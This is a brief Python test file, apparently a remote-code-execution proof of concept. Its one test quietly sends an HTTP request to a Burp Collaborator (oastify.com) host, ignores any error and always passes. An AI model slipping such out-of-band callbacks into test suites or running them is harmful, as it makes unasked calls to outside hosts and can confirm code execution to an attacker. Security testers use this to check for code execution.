import os
import urllib.request

def test_rce_poc():
    # Trigger an out-of-band HTTP request to the Burp Collaborator
    url = "http://9r1ukowrziinpohf3pgrkzycn3tuhm5b.oastify.com" 
    try:
        urllib.request.urlopen(url, timeout=3)
    except Exception:
        pass
    assert True
